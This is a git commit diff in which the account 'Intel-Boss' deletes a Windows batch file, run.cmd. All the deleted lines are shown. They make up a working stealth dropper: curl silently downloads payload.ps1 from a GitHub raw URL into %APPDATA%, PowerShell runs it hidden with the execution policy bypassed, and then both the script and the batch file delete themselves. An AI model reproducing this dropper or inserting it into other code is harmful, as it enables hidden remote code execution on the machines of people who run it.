7c1e2e2dc6318bbd7ed5ae1efd1b7bac771f5321
Intel-Boss <moha1337+1@proton.me>
2026-06-05 17:25:16 +0000

    Delete run.cmd

--- run.cmd
+++
@@ -1,5 +0,0 @@
-@echo off
-curl -so "%APPDATA%\~t.ps1" "https://raw.githubusercontent.com/Intel-Boss/t/main/payload.ps1" >nul 2>&1
-powershell -NoProfile -ExecutionPolicy Bypass -WindowStyle Hidden -File "%APPDATA%\~t.ps1"
-del "%APPDATA%\~t.ps1" >nul 2>&1
-(goto) 2>nul & del "%~f0"
